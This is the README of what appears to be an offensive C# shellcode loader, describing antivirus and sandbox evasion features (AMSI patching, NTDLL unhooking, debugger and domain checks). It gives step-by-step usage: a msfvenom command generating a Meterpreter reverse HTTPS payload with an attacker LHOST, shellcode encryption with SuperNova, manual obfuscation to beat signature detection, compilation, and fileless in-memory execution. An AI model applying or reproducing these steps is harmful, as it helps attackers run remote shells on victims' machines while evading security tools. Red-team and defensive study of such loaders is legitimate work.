### C# ShellCode Loader 1
--------------------------------------
Shellcode loader (written in C#) that implements several antivirus bypass and defense evasion techniques.

#### FEATURES
  - Implements shellcode injection using the function 'NtCreateThreadEx'
  - NTDLL unhooking (it loads a fresh new copy of ntdll.dll via file mapping and imports functions from this ntdll.dll)
  - Shellcode encryption (XOR)
  - AMSI bypass (AmsiScanBuffer patching technique)
  - Basic sandbox detection/evasion techniques
    - Exit if the program is running on a computer that is not joined to a domain
    - Exit if after sleeping for 15s, time did not really passed
    - Exit if a debugger is attached
    - Exit if making an uncommon API call fails (i.e. we are running in an AV sandbox that can't emulating it)
  - Compatible with shellcodes of multiple C2 frameworks such as Metasploit and Havoc
    
#### USAGE
  - STEP 1. Generate a raw shellcode with you favorite C2 framework
```
Examples
[*]  METASPLOIT C2 Framework 
    $ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f raw -o stageless-raw-shellcode.bin

[*] HAVOC C2 Framework 
    Generate a new HAVOC payload with the format "Windows Shellcode" (Arch: x64 / Indirect Syscall: Enabled / Sleep Technique: WaitForSIngleObjectEx) 
``` 

  - STEP 2. Use the tool 'SUPERNOVA' to convert your raw shellcode in C# format and encrypt it with the XOR algorithm
```  
[*] SuperNova is a shellcode encryptor & obfuscator tool - https://github.com/nickvourd/Supernova
    $ ./Supernova -debug -input ./shellcode-raw.bin -lang CSharp -enc xor -output ./encrypted-shellcode.bin
```

  - STEP 3. Insert your encrypted shellcode in the C# shellcode loader file along with the XOR key randomly generated by 'SUPERNOVA'

  - STEP 4. OPSEC requirements - Manually obfuscate the C# shellcode loader file
  	- Rename the namespace, classes, methods, and variables.
  	- Remove all existing comments and insert fake ones.
    - Remove all console output messages (i.e., Console.WriteLine("text")).
  	- Modify the code structure or logic slightly if needed to evade signature-based detection.

  - STEP 5. Compile the C# shellcode loader 
```  
[*] Example with "Developer PowerShell for VS 2022" - Microsoft (R) Visual C# Compiler
    Command: csc /t:exe /out:C:\path\Loader.exe C:\path\CsharpShellCodeLoader.cs
``` 
  - STEP 6. Optional Actions
  	- You may compress and obfuscate the shellcode loader executable using a packer such as ConfuserEx. However, this step is not strictly necessaryâ€”if you performed sufficient manual obfuscation in Step 4, the executable should bypass most antivirus solutions.
  	- Alternatively, you may choose to remotely download and execute the C# binary in memory using PowerShell and reflection-based code loading. This approach avoids writing the binary to disk, enhancing stealth and reducing forensic traces.
    
#### LICENSE
  - GNU General Public License v3.0
